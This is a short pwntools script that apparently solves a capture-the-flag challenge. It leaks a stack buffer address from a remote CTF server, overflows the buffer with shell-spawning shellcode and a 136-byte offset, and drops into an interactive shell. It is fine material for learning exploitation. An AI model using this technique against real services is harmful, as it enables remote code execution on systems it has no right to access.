#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./whispered_secrets', checksec=False)

#needed to generate the shellcode
context.arch = 'amd64'
context.os = 'linux'

#python3 -c "from pwn import *; print(cyclic(200))
#128B (buf) + 8B (saved RBP)
OFFSET_TO_RIP = 136

p = remote("offsec.m0lecon.it", 13513)

leak_line = p.recvline_contains(b"secret:")

#to get only the address
buf_addr = int(leak_line.split(b"secret: ")[1].strip(), 16)
log.info(f"buf = {buf_addr:#x}")

#generates assembly code as a string that spawns a shell, then converts it into machine code
shellcode = asm(shellcraft.sh())

payload = flat(
    shellcode,
    b"A" * (OFFSET_TO_RIP - len(shellcode)),
    p64(buf_addr),
)
p.sendafter(b"secret:\n", payload)
p.interactive()
